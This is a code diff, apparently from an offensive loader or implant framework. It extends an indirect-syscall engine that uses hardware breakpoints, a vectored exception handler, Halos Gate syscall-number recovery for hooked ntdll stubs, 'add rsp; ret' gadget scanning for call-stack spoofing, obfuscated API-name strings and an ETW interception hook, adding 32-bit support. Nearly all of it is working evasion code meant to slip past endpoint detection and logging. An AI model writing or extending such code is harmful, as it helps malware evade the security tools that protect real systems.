@@ -6,9 +6,67 @@
 
 /* INDIRECT SYSCALLS : */
 
+// ── Architecture-specific register & pattern abstraction ────────
+#ifdef _WIN64
+#define CTX_IP(ctx)     ((ctx)->Rip)
+#define CTX_SP(ctx)     ((ctx)->Rsp)
+#define CTX_ARG1(ctx)   ((ctx)->Rcx)
+#define CTX_ARG5(ctx)   ((ctx)->R10)
+#define CTX_RET(ctx)    ((ctx)->Rax)
+#define CTX_DR(ctx, n)  ((ctx)->Dr ## n)
+#define CTX_SYSCALL_ARG(ctx) ((ctx)->R10)
+
+#define HALOS_GATE_SIG   { 0x4C, 0x8B, 0xD1, 0xB8 }
+#define HALOS_GATE_SIG_LEN 4
+#define HALOS_GATE_SIG_MASK "xxxx"
+
+#define SYSCALL_INSN_SIG  { 0x0F, 0x05 }
+#define SYSCALL_INSN_LEN 2
+
+#define GADGET_PREFIX_BYTES 2
+#define GADGET_IMM8_OFFSET 3
+#define GADGET_LEN         5
+
+#define STACK_SLOT_SIZE   8
+#define STACK_SPOOF_SLOTS 5
+
+// SSN byte offsets: x64 prologue 4C 8B D1 B8 [low] [high]
+#define SSN_LOW_OFFSET  4
+#define SSN_HIGH_OFFSET 5
+
+#else // x86
+#define CTX_IP(ctx)     ((ctx)->Eip)
+#define CTX_SP(ctx)     ((ctx)->Esp)
+#define CTX_ARG1(ctx)   ((ctx)->Ecx)
+#define CTX_ARG5(ctx)   ((ctx)->Edx)
+#define CTX_RET(ctx)    ((ctx)->Eax)
+#define CTX_DR(ctx, n)  ((ctx)->Dr ## n)
+#define CTX_SYSCALL_ARG(ctx) ((ctx)->Edx)
+
+#define HALOS_GATE_SIG   { 0x8B, 0xD4 }
+#define HALOS_GATE_SIG_LEN 2
+#define HALOS_GATE_SIG_MASK "xx"
+
+#define SYSCALL_INSN_SIG  { 0x0F, 0x34 }
+#define SYSCALL_INSN_LEN 2
+
+#define GADGET_PREFIX_BYTES 1
+#define GADGET_IMM8_OFFSET 2
+#define GADGET_LEN         4
+
+#define STACK_SLOT_SIZE   4
+#define STACK_SPOOF_SLOTS 5
+
+// SSN byte offsets within the syscall prologue (after HALOS_GATE_SIG match)
+// x64: 4C 8B D1 B8 [low] [high] ... -> low at +4, high at +5
+// x86: 8B D4 B8 [low] [high] ...     -> low at +3, high at +4
+#define SSN_LOW_OFFSET  3
+#define SSN_HIGH_OFFSET 4
+#endif
+
 static functionTable* g_functionTable = nullptr;
 static bool InitHWSyscalls(void);
-static UINT64 PrepareSyscall(char* functionName);
+static ULONG_PTR PrepareSyscall(char* functionName);
 static const char* g_custom_pivot = nullptr;
 
 extern "C" void setSyscallPivot(const char* pivot) {
@@ -127,6 +185,7 @@ static int getLoadedModules(PVOID* outBases, PUNICODE_STRING* outNames, int maxC
 }
 
 /* Gadget patterns: 'add rsp, imm8; ret' for various immediate values */
+#ifdef _WIN64
 static const BYTE g_gadgetPatterns[][5] = {
     {0x48,0x83,0xC4,0x08,0xC3},   /* add rsp,08 ; ret */
     {0x48,0x83,0xC4,0x10,0xC3},   /* add rsp,10 ; ret */
@@ -145,6 +204,26 @@ static const BYTE g_gadgetPatterns[][5] = {
     {0x48,0x83,0xC4,0x78,0xC3},   /* add rsp,78 ; ret */
     {0x48,0x83,0xC4,0x80,0xC3},   /* add rsp,80 ; ret */
 };
+#else
+static const BYTE g_gadgetPatterns[][4] = {
+    {0x83,0xC4,0x08,0xC3},   /* add esp,08 ; ret */
+    {0x83,0xC4,0x10,0xC3},   /* add esp,10 ; ret */
+    {0x83,0xC4,0x18,0xC3},   /* add esp,18 ; ret */
+    {0x83,0xC4,0x20,0xC3},   /* add esp,20 ; ret */
+    {0x83,0xC4,0x28,0xC3},   /* add esp,28 ; ret */
+    {0x83,0xC4,0x30,0xC3},   /* add esp,30 ; ret */
+    {0x83,0xC4,0x38,0xC3},   /* add esp,38 ; ret */
+    {0x83,0xC4,0x40,0xC3},   /* add esp,40 ; ret */
+    {0x83,0xC4,0x48,0xC3},   /* add esp,48 ; ret */
+    {0x83,0xC4,0x50,0xC3},   /* add esp,50 ; ret */
+    {0x83,0xC4,0x58,0xC3},   /* add esp,58 ; ret */
+    {0x83,0xC4,0x60,0xC3},   /* add esp,60 ; ret */
+    {0x83,0xC4,0x68,0xC3},   /* add esp,68 ; ret */
+    {0x83,0xC4,0x70,0xC3},   /* add esp,70 ; ret */
+    {0x83,0xC4,0x78,0xC3},   /* add esp,78 ; ret */
+    {0x83,0xC4,0x80,0xC3},   /* add esp,80 ; ret */
+};
+#endif
 #define GADGET_PATTERN_COUNT (sizeof(g_gadgetPatterns) / sizeof(g_gadgetPatterns[0]))
 
 /*
@@ -163,25 +242,25 @@ static void scanModuleForGadgets(PVOID moduleBase, PI_SYSCALLS_CTX ctx,
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);
     if (nt->Signature != IMAGE_NT_SIGNATURE) return;
 
-    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections && ctx->gadgetCount < MAX_RET_GADGETS; i++) {
-        /* Must be RX code section*/
+        /* Must be RX section */
         DWORD chars = sec[i].Characteristics;
         if (!(chars & IMAGE_SCN_MEM_EXECUTE) ||
-            !(chars & IMAGE_SCN_CNT_CODE)  ||
             !(chars & IMAGE_SCN_MEM_READ))
             continue;
 
         BYTE* sectionStart = (BYTE*)moduleBase + sec[i].VirtualAddress;
-        DWORD sectionSize  = sec[i].SizeOfRawData;
+        DWORD sectionSize  = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize)
+                             ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
         if (sectionSize == 0) continue;
 
         /* Try each pattern across this section */
-        for (DWORD off = 0; off + 5 <= sectionSize && ctx->gadgetCount < MAX_RET_GADGETS; off++) {
+        for (DWORD off = 0; off + GADGET_LEN <= sectionSize && ctx->gadgetCount < MAX_RET_GADGETS; off++) {
             for (UINT p = 0; p < GADGET_PATTERN_COUNT; p++) {
                 bool match = true;
-                for (int b = 0; b < 5; b++) {
+                for (int b = 0; b < GADGET_LEN; b++) {
                     if (sectionStart[off + b] != g_gadgetPatterns[p][b]) {
                         match = false;
                         break;
@@ -189,7 +268,7 @@ static void scanModuleForGadgets(PVOID moduleBase, PI_SYSCALLS_CTX ctx,
                 }
                 if (match) {
                     /* Found a gadget - deduplicate */
-                    UINT64 addr = (UINT64)(sectionStart + off);
+                    ULONG_PTR addr = (ULONG_PTR)(sectionStart + off);
                     bool dup = false;
                     for (int g = 0; g < ctx->gadgetCount; g++) {
                         if (ctx->gadgetTable[g].addr == addr) {
@@ -199,13 +278,13 @@ static void scanModuleForGadgets(PVOID moduleBase, PI_SYSCALLS_CTX ctx,
                     }
                     if (!dup) {
                         ctx->gadgetTable[ctx->gadgetCount].addr = addr;
-                        ctx->gadgetTable[ctx->gadgetCount].imm8 = g_gadgetPatterns[p][3];
+                        ctx->gadgetTable[ctx->gadgetCount].imm8 = g_gadgetPatterns[p][GADGET_IMM8_OFFSET];
                         ctx->gadgetCount++;
 
-                        g_debugPrint("[+] Gadget #%d: add rsp,0x%02X;ret @ 0x%llX (%ls)",
+                        g_debugPrint("[+] Gadget #%d: add rsp,0x%02X;ret @ 0x%p (%ls)",
                                      ctx->gadgetCount - 1,
-                                     g_gadgetPatterns[p][3],
-                                     (unsigned long long)addr,
+                                     g_gadgetPatterns[p][GADGET_IMM8_OFFSET],
+                                     (void*)addr,
                                      moduleName ? moduleName : L"???");
 
                         if (ctx->gadgetCount >= MAX_RET_GADGETS)
@@ -257,12 +336,12 @@ static bool CollectRetGadgets(PI_SYSCALLS_CTX ctx) {
  * Returns the chosen gadget's address; the caller reads imm8 separately
  * from the same table entry for correct stack-frame sizing.
  */
-static UINT64 PickRandomGadget(PI_SYSCALLS_CTX ctx, UINT8* outImm8) {
+static ULONG_PTR PickRandomGadget(PI_SYSCALLS_CTX ctx, UINT8* outImm8) {
     if (!ctx || ctx->gadgetCount == 0) return 0;
 
     /* Use RDTSC + fold for selection (not crypto-grade, fine for index) */
     UINT64 tsc = ___rdtsc();
-    int index = (int)(tsc % ctx->gadgetCount);
+    int index = (int)((UINT32)tsc % ctx->gadgetCount);
 
     if (outImm8) *outImm8 = ctx->gadgetTable[index].imm8;
     return ctx->gadgetTable[index].addr;
@@ -290,41 +369,30 @@ static DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHA
 
 /* Halos gate */
 
-DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
-    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
+static const BYTE kHalosGateSig[] = HALOS_GATE_SIG;
+static const BYTE kSyscallInsnSig[] = SYSCALL_INSN_SIG;
+
+ULONG_PTR FindSyscallNumber(ULONG_PTR functionAddress) {
     WORD syscallNumber = 0;
 
     for (WORD idx = 1; idx <= 500; idx++) {
-        // check neighboring syscall down
-        if (*((PBYTE)functionAddress + idx * DOWN) == 0x4c
-            && *((PBYTE)functionAddress + 1 + idx * DOWN) == 0x8b
-            && *((PBYTE)functionAddress + 2 + idx * DOWN) == 0xd1
-            && *((PBYTE)functionAddress + 3 + idx * DOWN) == 0xb8
-            && *((PBYTE)functionAddress + 6 + idx * DOWN) == 0x00
-            && *((PBYTE)functionAddress + 7 + idx * DOWN) == 0x00) {
-            BYTE high = *((PBYTE)functionAddress + 5 + idx * DOWN);
-            BYTE low = *((PBYTE)functionAddress + 4 + idx * DOWN);
-
+        if (__memcmp((PBYTE)(functionAddress + idx * DOWN),
+                     kHalosGateSig, HALOS_GATE_SIG_LEN) == 0) {
+            BYTE high = *((PBYTE)functionAddress + SSN_HIGH_OFFSET + idx * DOWN);
+            BYTE low = *((PBYTE)functionAddress + SSN_LOW_OFFSET + idx * DOWN);
             syscallNumber = ((high << 8) | low) - idx;
             g_debugPrint("[+] Found SSN: 0x%X", syscallNumber);
             break;
         }
 
-        // check neighboring syscall up
-        if (*((PBYTE)functionAddress + idx * UP) == 0x4c
-            && *((PBYTE)functionAddress + 1 + idx * UP) == 0x8b
-            && *((PBYTE)functionAddress + 2 + idx * UP) == 0xd1
-            && *((PBYTE)functionAddress + 3 + idx * UP) == 0xb8
-            && *((PBYTE)functionAddress + 6 + idx * UP) == 0x00
-            && *((PBYTE)functionAddress + 7 + idx * UP) == 0x00) {
-            BYTE high = *((PBYTE)functionAddress + 5 + idx * UP);
-            BYTE low = *((PBYTE)functionAddress + 4 + idx * UP);
-
+        if (__memcmp((PBYTE)(functionAddress + idx * UP),
+                     kHalosGateSig, HALOS_GATE_SIG_LEN) == 0) {
+            BYTE high = *((PBYTE)functionAddress + SSN_HIGH_OFFSET + idx * UP);
+            BYTE low = *((PBYTE)functionAddress + SSN_LOW_OFFSET + idx * UP);
             syscallNumber = ((high << 8) | low) + idx;
             g_debugPrint("[+] Found SSN: 0x%X", syscallNumber);
             break;
         }
-
     }
 
     if (syscallNumber == 0) {
@@ -334,14 +402,13 @@ DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
     return syscallNumber;
 }
 
-DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
-    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
-    DWORD64 syscallReturnAddress = 0;
+ULONG_PTR FindSyscallReturnAddress(ULONG_PTR functionAddress, WORD syscallNumber) {
+    ULONG_PTR syscallReturnAddress = 0;
 
     for (WORD idx = 1; idx <= 32; idx++) {
-        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
-            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
-            g_debugPrint("[+] Found \"syscall;ret;\" opcode address: 0x%llX", (unsigned long long)syscallReturnAddress);
+        if (__memcmp((PBYTE)functionAddress + idx, kSyscallInsnSig, SYSCALL_INSN_LEN) == 0) {
+            syscallReturnAddress = (ULONG_PTR)((PBYTE)functionAddress + idx);
+            g_debugPrint("[+] Found \"syscall;ret;\" opcode address: 0x%p", (void*)syscallReturnAddress);
             break;
         }
     }
@@ -361,7 +428,7 @@ DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
 */
 
 __attribute__((optnone))
-static UINT64 PrepareSyscall(char* functionName) {
+static ULONG_PTR PrepareSyscall(char* functionName) {
     // ctx is always valid after initHWSyscalls
     // Dr0 breakpoint on this function address triggers VEH Phase1 to fill ntFunctionAddress
     // After VEH advances RIP, this returns the real NT stub address
@@ -376,15 +443,15 @@ static bool SetMainBreakpoint(void) {
 
     PI_SYSCALLS_CTX ctx = g_functionTable->parameters.syscalls_ctx;
 
-    UINT64 ntdllBase = (UINT64)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
+    ULONG_PTR ntdllBase = (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
     ctx->pivotApiAddr = GetSymbolAddress(ntdllBase, g_custom_pivot);
 
     if (!ctx->pivotApiAddr) {
         g_debugPrint("[-] Failed to resolve pivot API");
         return false;
     }
-    g_debugPrint("[+] Pivot API: 0x%llX", (unsigned long long)ctx->pivotApiAddr);
-    UINT64 k32Base  = (UINT64)GetModuleBaseAddress(lcg_encryptw(L"kernel32.dll"));
+    g_debugPrint("[+] Pivot API: 0x%p", (void*)ctx->pivotApiAddr);
+    ULONG_PTR k32Base  = (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"kernel32.dll"));
 
     ctx->threadInitThunkRetAddr = GetSymbolAddress(k32Base, lcg_encrypt("BaseThreadInitThunk")) + 0x14;
     ctx->rtlUserThreadStartAddr = GetSymbolAddress(ntdllBase, lcg_encrypt("RtlUserThreadStart")) + 0x21;
@@ -400,7 +467,7 @@ static bool SetMainBreakpoint(void) {
     }
 
     // Hard-zero everything first to avoid leftover garbage Dr state
-    threadCtx.Dr0 = (UINT64)&PrepareSyscall;
+    threadCtx.Dr0 = (ULONG_PTR)&PrepareSyscall;
     threadCtx.Dr1 = 0;  // Set dynamically in VEH Phase 1
     threadCtx.Dr2 = 0;
     threadCtx.Dr3 = 0;
@@ -416,8 +483,8 @@ static bool SetMainBreakpoint(void) {
         return false;
     }
 
-    g_debugPrint("[+] Dr0 set to PrepareSyscall (0x%llX), Dr1 idle",
-                 (unsigned long long)&PrepareSyscall);
+    g_debugPrint("[+] Dr0 set to PrepareSyscall (0x%p), Dr1 idle",
+                 (void*)&PrepareSyscall);
     return true;
 }
 
@@ -446,18 +513,18 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
     // ===================================================
     // PHASE 1: Dr0 @ PrepareSyscall ENTRY (RCX=function name)
     // ===================================================
-    if (regs->Rip == (UINT64)&PrepareSyscall) {
-        if (!regs->Rcx) {
+    if (CTX_IP(regs) == (ULONG_PTR)&PrepareSyscall) {
+        if (!CTX_ARG1(regs)) {
             g_debugPrint("[-] Phase1: RCX NULL");
             goto cleanup_and_continue_search;
         }
 
         ctx->ntFunctionAddress = GetSymbolAddress(
-            (UINT64)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll")),
-            (const char*)regs->Rcx);
+            (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll")),
+            (const char*)CTX_ARG1(regs));
 
         if (!ctx->ntFunctionAddress) {
-            g_debugPrint("[-] Phase1: Resolve failed '%s'", (char*)regs->Rcx);
+            g_debugPrint("[-] Phase1: Resolve failed '%s'", (char*)CTX_ARG1(regs));
             goto cleanup_and_continue_search;
         }
 
@@ -474,27 +541,27 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
             goto cleanup_and_continue_search;
         }
 
-        g_VERBOSE("[+] Phase1 '%s': SSN=0x%llX ret=0x%llX",
-                     (char*)regs->Rcx,
-                     (unsigned long long)ctx->cachedSSN,
-                     (unsigned long long)ctx->cachedSyscallRetAddr);
+        g_VERBOSE("[+] Phase1 '%s': SSN=0x%p ret=0x%p",
+                     (char*)CTX_ARG1(regs),
+                     (void*)ctx->cachedSSN,
+                     (void*)ctx->cachedSyscallRetAddr);
 
         // DISARM Dr0 - no more breakpoints on PrepareSyscall for this invocation
-        regs->Dr0 = 0;
+        CTX_DR(regs, 0) = 0;
         regs->Dr7 &= ~(1 << 0);           // L0=0
         regs->Dr7 &= ~((3 << 16) | (3 << 18)); // Clear R/W0 + LEN0
 
         // Set Dr1 -> ntFunctionAddress (for Phase 2)
-        regs->Dr1 = ctx->ntFunctionAddress;
+        CTX_DR(regs, 1) = ctx->ntFunctionAddress;
         regs->Dr7 |=  (1 <<  2);  // L1=1 (Dr1 local enable)
         regs->Dr7 &= ~(1 <<  3);  // G1=0 (Dr1 not global)
         regs->Dr7 &= ~(3 << 20);  // R/W1=00 (Dr1 execute)
         regs->Dr7 &= ~(3 << 22);  // LEN1=00 (Dr1 byte size)
 
         // In Phase1 - simulate PrepareSyscall doing a normal `ret`
-        regs->Rax = ctx->ntFunctionAddress;   // return value in RAX (calling convention)
-        regs->Rip = *(PULONG64)(regs->Rsp);  // [RSP] = return addr pushed by `call PrepareSyscall`
-        regs->Rsp += 8;                       // pop it (simulate ret)
+        CTX_RET(regs) = ctx->ntFunctionAddress;
+        CTX_IP(regs) = *(ULONG_PTR*)(ULONG_PTR)CTX_SP(regs);
+        CTX_SP(regs) += STACK_SLOT_SIZE;
 
         regs->Dr6 = 0;
         return EXCEPTION_CONTINUE_EXECUTION;
@@ -503,22 +570,22 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
     // ===================================================
     // PHASE 2: Dr1 @ ntFunctionAddress ENTRY (RCX=REAL ARG1)
     // ===================================================
-    if (regs->Rip == ctx->ntFunctionAddress) {
+    if (CTX_IP(regs) == ctx->ntFunctionAddress) {
         g_VERBOSE("[+] Phase2: NT stub entry - args live");
 
         // Halos Gate hook detection
-        DWORD64 funcAddr = regs->Rip;
-        static BYTE nonHookedBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
-        if (!FindPattern(funcAddr, 4, nonHookedBytes, (PCHAR)"xxxx")) {
+        ULONG_PTR funcAddr = CTX_IP(regs);
+        if (!FindPattern(funcAddr, HALOS_GATE_SIG_LEN,
+                         (PBYTE)kHalosGateSig, (PCHAR)HALOS_GATE_SIG_MASK)) {
             g_debugPrint("[+] Phase2: HOOKED - Halos Gate");
 
-            WORD hgSSN = FindSyscallNumber(funcAddr);
+            WORD hgSSN = (WORD)FindSyscallNumber(funcAddr);
             if (hgSSN == 0) {
                 g_debugPrint("[-] Phase2: HG SSN failed - fallback to hook");
                 goto phase2_cleanup;
             }
 
-            DWORD64 hgRetAddr = FindSyscallReturnAddress(funcAddr, hgSSN);
+            ULONG_PTR hgRetAddr = FindSyscallReturnAddress(funcAddr, hgSSN);
             if (!hgRetAddr) {
                 g_debugPrint("[-] Phase2: HG ret failed");
                 goto phase2_cleanup;
@@ -526,19 +593,19 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
 
             ctx->cachedSSN = hgSSN;
             ctx->cachedSyscallRetAddr = hgRetAddr;
-            g_debugPrint("[+] Phase2: HG SSN=0x%X ret=0x%llX",
-                         hgSSN, (unsigned long long)hgRetAddr);
+            g_debugPrint("[+] Phase2: HG SSN=0x%X ret=0x%p",
+                         hgSSN, (void*)hgRetAddr);
         }
         g_VERBOSE("Found pattern! We are not hooked.");
 
         // Move to Phase 3: Dr1 -> pivot, Rip -> pivot
         regs->Dr6 = 0;
-        regs->Dr1 = ctx->pivotApiAddr;
-        regs->Rip = ctx->pivotApiAddr;
+        CTX_DR(regs, 1) = ctx->pivotApiAddr;
+        CTX_IP(regs) = ctx->pivotApiAddr;
         return EXCEPTION_CONTINUE_EXECUTION;
 
     phase2_cleanup:
-        regs->Dr1 = 0;
+        CTX_DR(regs, 1) = 0;
         regs->Dr7 &= ~(1 << 2);  // L1=0
         regs->Dr7 &= ~((3<<20) | (3<<22)); // Clear Dr1 R/W1 + LEN1
         regs->Dr6 = 0;
@@ -549,18 +616,18 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
     // ===================================================
     // PHASE 3: Dr1 @ pivotApiAddr ENTRY (stack legit, args intact)
     // ===================================================
-    if (regs->Rip == ctx->pivotApiAddr) {
+    if (CTX_IP(regs) == ctx->pivotApiAddr) {
         g_VERBOSE("[+] Phase3: Pivot - spoofing frame");
 
         {   /* scope for gadget variables (avoid goto bypass) */
         UINT8 gadgetImm8 = 0x68;  /* fallback: 0x68 = 104 bytes */
-        UINT64 gadgetAddr = 0;
+        ULONG_PTR gadgetAddr = 0;
 
         if (ctx->gadgetCount == 0 || !ctx->cachedSSN || !ctx->cachedSyscallRetAddr) {
-            g_debugPrint("[-] Phase3: Missing cached data (gadgets=%d, ssn=0x%llX, ret=0x%llX)",
+            g_debugPrint("[-] Phase3: Missing cached data (gadgets=%d, ssn=0x%p, ret=0x%p)",
                          ctx->gadgetCount,
-                         (unsigned long long)ctx->cachedSSN,
-                         (unsigned long long)ctx->cachedSyscallRetAddr);
+                         (void*)ctx->cachedSSN,
+                         (void*)ctx->cachedSyscallRetAddr);
             goto full_cleanup;
         }
 
@@ -572,30 +639,30 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
         }
 
         /* Stack spoof - frame size matches the gadget's 'add rsp, imm8' */
-        regs->Rsp -= gadgetImm8;
-        *(PULONG64)(regs->Rsp) = gadgetAddr;
+        CTX_SP(regs) -= gadgetImm8;
+        *(ULONG_PTR*)(ULONG_PTR)CTX_SP(regs) = gadgetAddr;
         for (size_t idx = 0; idx < STACK_ARGS_LENGTH; ++idx) {
-            size_t offset = idx * sizeof(ULONG64) + STACK_ARGS_RSP_OFFSET;
-            *(PULONG64)(regs->Rsp + offset) =
-                *(PULONG64)(regs->Rsp + offset + gadgetImm8);
+            size_t offset = idx * STACK_SLOT_SIZE + STACK_ARGS_RSP_OFFSET;
+            *(ULONG_PTR*)(CTX_SP(regs) + offset) =
+                *(ULONG_PTR*)(CTX_SP(regs) + offset + gadgetImm8);
         }
 
         // Syscall dispatch (ntdll origin)
-        regs->R10 = regs->Rcx;  // RCX now has REAL first arg!
-        regs->Rax = ctx->cachedSSN;
-        regs->Rip = ctx->cachedSyscallRetAddr;
+        CTX_SYSCALL_ARG(regs) = CTX_ARG1(regs);
+        CTX_RET(regs) = ctx->cachedSSN;
+        CTX_IP(regs) = ctx->cachedSyscallRetAddr;
 
-        g_VERBOSE("[+] Phase3: syscall from ntdll!0x%llX SSN=0x%llX gadget=0x%llX(imm=0x%02X)",
-                     (unsigned long long)ctx->cachedSyscallRetAddr,
-                     (unsigned long long)ctx->cachedSSN,
-                     (unsigned long long)gadgetAddr,
+        g_VERBOSE("[+] Phase3: syscall from ntdll!0x%p SSN=0x%p gadget=0x%p(imm=0x%02X)",
+                     (void*)ctx->cachedSyscallRetAddr,
+                     (void*)ctx->cachedSSN,
+                     (void*)gadgetAddr,
                      gadgetImm8);
         }
 
     full_cleanup:
         g_VERBOSE("Entered full_cleanup...");
-        regs->Dr0 = (UINT64)&PrepareSyscall;
-        regs->Dr1 = regs->Dr2 = regs->Dr3 = 0;
+        CTX_DR(regs, 0) = (ULONG_PTR)&PrepareSyscall;
+        CTX_DR(regs, 1) = CTX_DR(regs, 2) = CTX_DR(regs, 3) = 0;
         regs->Dr6 = 0;
         regs->Dr7 = 0;
         regs->Dr7 |= (1 << 0);  // L0=1, execute condition (bits 16-17 = 00, already clear)
@@ -606,7 +673,7 @@ LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo)
 
     }
 
-    g_debugPrint("[-] Unexpected RIP=0x%llX", (unsigned long long)regs->Rip);
+    g_debugPrint("[-] Unexpected RIP=0x%p", (void*)CTX_IP(regs));
 
     // Try ETW handler (check if HWBP hit on NtTraceEvent)
     etwResult = ETW_HandleException(ExceptionInfo);
